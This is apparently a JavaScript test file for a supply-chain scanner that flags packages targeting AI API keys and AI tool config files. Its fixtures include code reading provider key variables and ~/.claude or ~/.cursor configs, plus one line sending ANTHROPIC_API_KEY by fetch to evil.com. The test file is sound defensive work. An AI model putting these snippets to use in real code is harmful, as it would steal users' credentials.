import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/tier1-ai-token-targeting.js';

test('D22: ANTHROPIC_API_KEY detected as HIGH', async () => {
  const files = [{ path: 'install.js', content: 'const key = process.env.ANTHROPIC_API_KEY' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'claude_token_targeting'));
});

test('D22: OPENAI_API_KEY detected as HIGH', async () => {
  const files = [{ path: 'install.js', content: 'const key = process.env.OPENAI_API_KEY' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'openai_token_targeting'));
});

test('D22: GEMINI_API_KEY detected as HIGH', async () => {
  const files = [{ path: 'install.js', content: 'const key = process.env.GEMINI_API_KEY' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'gemini_token_targeting'));
});

test('D22: MISTRAL_API_KEY detected as HIGH', async () => {
  const files = [{ path: 'install.js', content: 'const key = process.env.MISTRAL_API_KEY' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'mistral_token_targeting'));
});

test('D22: CURSOR_API_KEY detected as HIGH', async () => {
  const files = [{ path: 'install.js', content: 'const key = process.env.CURSOR_API_KEY' }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'cursor_token_targeting'));
});

test('D22: ~/.cursor/settings.json targeting detected', async () => {
  const files = [{ path: 'steal.js', content: "readFileSync(expand('~/.cursor/settings.json'))" }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'cursor_token_targeting'));
});

test('D22: ~/.claude/mcp.json config targeting detected', async () => {
  const files = [{ path: 'steal.js', content: "readFileSync(expand('~/.claude/mcp.json'))" }];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].detail?.some((d) => d.type === 'ai_config_targeting'));
});

test('D22: AI token + fetch exfiltration returns BLOCK', async () => {
  const files = [
    {
      path: 'exfil.js',
      content: 'const key = process.env.ANTHROPIC_API_KEY; fetch("https://evil.com/steal?key=" + key)',
    },
  ];
  const findings = await scan({}, [], null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].recommendation?.startsWith('BLOCK'));
  assert.ok(findings[0].detail?.some((d) => d.type === 'ai_token_exfiltration'));
});

test('D22: legitimate AI app producing no findings', async () => {
  const files = [
    {
      path: 'app.js',
      content: 'const response = await client.messages.create({ model: "claude-3", max_tokens: 1024 });',
    },
  ];
  const findings = await scan({}, [], null, files);
  assert.equal(findings.length, 0);
});

test('D22: empty package returns no findings', async () => {
  const findings = await scan({}, [], null, []);
  assert.equal(findings.length, 0);
});

test('D22: no files returns no findings', async () => {
  const findings = await scan({}, [], null, null);
  assert.equal(findings.length, 0);
});
